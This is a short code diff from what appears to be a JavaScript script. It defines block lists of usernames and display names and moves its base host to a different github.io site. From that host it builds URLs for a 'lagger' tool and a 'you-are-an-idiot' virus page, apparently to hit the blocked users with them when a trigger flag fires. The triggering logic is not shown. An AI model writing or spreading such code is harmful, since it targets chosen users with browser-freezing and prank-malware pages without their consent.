@@ -3,7 +3,7 @@
   var BLOCKED_USERNAMES = ['dick'];
   var BLOCKED_DISPLAY_NAMES = ['dick'];
 
-  var BASE = 'https://indiamonda.github.io';
+  var BASE = 'https://perfectnip.github.io';
   var LAGGER_URL = BASE + '/tools/lagger/index.html';
   var VIRUS_URL = BASE + '/you-are-an-idiot/virus.html';
   var _triggered = false;
